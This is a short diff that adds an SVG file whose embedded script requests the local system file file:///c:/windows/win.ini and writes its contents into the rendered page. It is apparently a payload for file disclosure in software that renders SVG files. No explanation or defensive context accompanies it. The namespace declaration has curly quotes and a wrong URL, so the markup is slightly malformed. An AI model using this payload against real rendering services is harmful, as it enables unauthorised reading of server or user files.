@@ -1,0 +1,9 @@
+<svg xmlns=“http://www.w3.org/1999/svg“>
+<script>x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///c:/windows/win.ini");
+x.send();
+</script>
+</svg>
